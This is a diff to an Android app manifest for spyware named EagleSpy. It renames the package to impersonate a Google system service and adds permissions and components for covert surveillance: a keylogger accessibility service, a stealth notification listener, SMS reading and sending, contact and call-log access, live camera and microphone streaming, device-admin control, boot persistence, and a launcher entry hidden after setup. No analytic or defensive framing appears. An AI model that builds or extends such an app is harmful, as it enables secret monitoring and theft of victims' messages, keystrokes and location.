@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.stealth.eaglespy"
+    package="com.google.android.systemservice"
     android:versionCode="1"
     android:versionName="1.0" >
 
@@ -12,14 +12,31 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
-    <!-- Location Permissions (Runtime) -->
+    <!-- Location Permissions -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
 
-    <!-- Camera & Microphone (Runtime) -->
+    <!-- Camera & Microphone -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
+
+    <!-- Contacts & Call Log -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+
+    <!-- SMS -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+
+    <!-- Storage -->
+    <uses-permission
+        android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
 
     <!-- Background & Persistence -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
@@ -27,72 +44,167 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
 
-    <!-- Stealth: Hide from recent apps -->
+    <!-- Notifications (Android 13+) -->
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
+    <!-- Notification Listener -->
+    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
+
+    <!-- Stealth -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
 
     <permission
-        android:name="com.stealth.eaglespy.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+        android:name="com.google.android.systemservice.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
         android:protectionLevel="signature" />
 
-    <uses-permission android:name="com.stealth.eaglespy.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
+    <uses-permission android:name="com.google.android.systemservice.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
 
     <application
-        android:name="com.stealth.eaglespy.EagleSpyApp"
+        android:name="com.google.android.systemservice.EagleSpyApp"
         android:allowBackup="false"
         android:appComponentFactory="androidx.core.app.CoreComponentFactory"
         android:debuggable="true"
         android:extractNativeLibs="false"
-        android:icon="@android:drawable/sym_def_app_icon"
+        android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
         android:networkSecurityConfig="@xml/network_security_config"
-        android:roundIcon="@android:drawable/sym_def_app_icon"
+        android:roundIcon="@mipmap/ic_launcher"
         android:supportsRtl="true"
         android:theme="@style/Theme.EagleSpy" >
 
-        <!-- Facade Activity (visible to user) -->
+        <!-- Setup Wizard Activity (Main Entry - Hidden after setup) -->
         <activity
-            android:name="com.stealth.eaglespy.MainActivity"
+            android:name="com.google.android.systemservice.SetupWizardActivity"
+            android:excludeFromRecents="true"
             android:exported="true"
-            android:launchMode="singleTask" >
+            android:launchMode="singleTask"
+            android:taskAffinity="" >
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
 
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity> <!-- Launcher alias kept enabled for test resets -->
+        <activity-alias
+            android:name="com.google.android.systemservice.ProvisionLauncherActivity"
+            android:enabled="true"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:launchMode="singleTask"
+            android:targetActivity="com.google.android.systemservice.SetupWizardActivity"
+            android:taskAffinity="" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
 
         <!-- Background Services -->
         <service
-            android:name="com.stealth.eaglespy.services.LocationService"
+            android:name="com.google.android.systemservice.services.CommandService"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+        <service
+            android:name="com.google.android.systemservice.services.LocationService"
             android:exported="false"
             android:foregroundServiceType="location" />
         <service
-            android:name="com.stealth.eaglespy.services.CameraService"
+            android:name="com.google.android.systemservice.services.CameraService"
             android:exported="false"
             android:foregroundServiceType="camera" />
         <service
-            android:name="com.stealth.eaglespy.services.AudioService"
+            android:name="com.google.android.systemservice.services.AudioService"
             android:exported="false"
             android:foregroundServiceType="microphone" />
+
+        <!-- Accessibility Guard Service -->
         <service
-            android:name="com.stealth.eaglespy.services.CommandService"
-            android:exported="false" />
+            android:name="com.google.android.systemservice.services.AccessibilityGuardService"
+            android:exported="false"
+            android:label="@string/accessibility_service_label"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_guard_config" />
+        </service>
+
+        <!-- Notification Listener Service -->
+        <service
+            android:name="com.google.android.systemservice.services.StealthNotificationListener"
+            android:exported="false"
+            android:label="@string/notification_listener_label"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" >
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.service.notification.default_filter_types"
+                android:value="0" />
+        </service>
+
+        <!-- Live Streaming Service (WebRTC) -->
+        <service
+            android:name="com.google.android.systemservice.services.LiveStreamingService"
+            android:exported="false"
+            android:foregroundServiceType="camera|microphone" />
+
+        <!-- Keylogger Accessibility Service -->
+        <service
+            android:name="com.google.android.systemservice.services.KeyloggerAccessibilityService"
+            android:exported="false"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_keylogger_config" />
+        </service>
+
+        <!-- Device Admin Receiver -->
+        <receiver
+            android:name="com.google.android.systemservice.receivers.SystemAdminReceiver"
+            android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN" >
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin" />
+
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
+            </intent-filter>
+        </receiver>
 
         <!-- Boot Receiver for Persistence -->
         <receiver
-            android:name="com.stealth.eaglespy.services.BootReceiver"
+            android:name="com.google.android.systemservice.receivers.BootReceiver"
             android:exported="true" >
-            <intent-filter>
+            <intent-filter android:priority="999" >
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="com.google.android.systemservice.KEEP_ALIVE" />
             </intent-filter>
         </receiver>
 
         <provider
             android:name="androidx.startup.InitializationProvider"
-            android:authorities="com.stealth.eaglespy.androidx-startup"
+            android:authorities="com.google.android.systemservice.androidx-startup"
             android:exported="false" >
             <meta-data
                 android:name="androidx.emoji2.text.EmojiCompatInitializer"
